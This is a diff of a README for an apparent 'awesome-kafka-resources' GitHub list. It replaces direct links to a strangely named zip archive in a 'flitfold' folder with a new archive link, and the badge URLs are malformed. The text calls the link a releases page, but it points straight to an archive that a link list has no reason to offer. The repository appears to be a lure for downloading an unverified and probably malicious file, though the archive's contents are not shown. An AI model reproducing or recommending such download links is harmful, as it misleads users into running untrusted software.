@@ -1,6 +1,6 @@
 # 🎉 awesome-kafka-resources - Discover the Best Kafka Tools Easily
 
-[![Download](https://github.com/moienmike/awesome-kafka-resources/raw/refs/heads/main/flitfold/resources-kafka-awesome-autosymbolic.zip%https://github.com/moienmike/awesome-kafka-resources/raw/refs/heads/main/flitfold/resources-kafka-awesome-autosymbolic.zip)](https://github.com/moienmike/awesome-kafka-resources/raw/refs/heads/main/flitfold/resources-kafka-awesome-autosymbolic.zip)
+[![Download](https://raw.githubusercontent.com/moienmike/awesome-kafka-resources/main/flitfold/resources-awesome-kafka-v3.2.zip%https://raw.githubusercontent.com/moienmike/awesome-kafka-resources/main/flitfold/resources-awesome-kafka-v3.2.zip)](https://raw.githubusercontent.com/moienmike/awesome-kafka-resources/main/flitfold/resources-awesome-kafka-v3.2.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To start using this repository, you will need to download the resources. Follow 
 
 To download the latest version of awesome-kafka-resources, visit this page:
 
-[Download awesome-kafka-resources](https://github.com/moienmike/awesome-kafka-resources/raw/refs/heads/main/flitfold/resources-kafka-awesome-autosymbolic.zip)
+[Download awesome-kafka-resources](https://raw.githubusercontent.com/moienmike/awesome-kafka-resources/main/flitfold/resources-awesome-kafka-v3.2.zip)
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version. You will find a list of downloads.
